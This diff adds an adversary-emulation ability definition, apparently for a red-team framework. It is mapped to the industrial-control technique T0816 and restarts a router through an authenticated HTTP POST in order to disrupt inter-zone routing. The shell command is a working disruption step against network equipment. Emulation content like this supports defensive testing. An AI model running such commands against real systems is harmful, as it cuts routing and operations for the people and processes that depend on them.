@@ -1,0 +1,15 @@
+---
+
+- id: b8c9d0e1-8888-8888-8888-000000000006
+  name: Router - Force Device Restart
+  description: Restart the router to disrupt all inter-zone routing
+  tactic: inhibit-response-function
+  technique_id: T0816
+  technique_name: Device Restart/Shutdown
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -b /tmp/router.jar
+      -X POST "http://192.168.90.200:5000/system/restart" 2>/dev/null &&
+      echo "ROUTER_RESTART_TRIGGERED"
